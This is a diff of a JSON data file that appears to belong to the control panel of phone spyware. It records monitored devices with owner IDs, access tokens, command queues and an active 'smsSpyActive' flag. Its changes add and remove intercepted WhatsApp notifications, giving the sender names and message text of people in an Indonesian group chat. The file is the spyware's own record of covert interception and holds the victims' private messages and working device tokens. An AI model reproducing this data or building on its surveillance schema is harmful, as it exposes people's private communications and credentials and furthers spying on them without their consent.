@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775043461871,
+    "lastSeen": 1775043467826,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12851 pesan): ~ s",
+        "content": ".bratvid p",
+        "time": "01/04 19:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043467670
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15081 pesan dari 9 chat",
+        "time": "01/04 19:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043464406
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12850 pesan): ~ Bot",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:28",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042898213
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12672 pesan): ~ r",
-        "content": "lu ga nge reply pesan itu jir, gimana mau menang",
-        "time": "01/04 19:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042898139
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12670 pesan): ~ 𐙚 ˚𝓅𝓊𝓅𝓊𝓉",
-        "content": "Jenis pesan tidak diketahui",
-        "time": "01/04 19:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042896191
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775043462916,
+    "lastSeen": 1775043466527,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15082 pesan dari 9 chat",
+        "time": "01/04 19:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043467841
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8056,14 +8064,6 @@
         "time": "01/04 19:28",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042898234
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12672 pesan): ~ r",
-        "content": "lu ga nge reply pesan itu jir, gimana mau menang",
-        "time": "01/04 19:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042898223
       }
     ],
     "galleryPhotos": [],
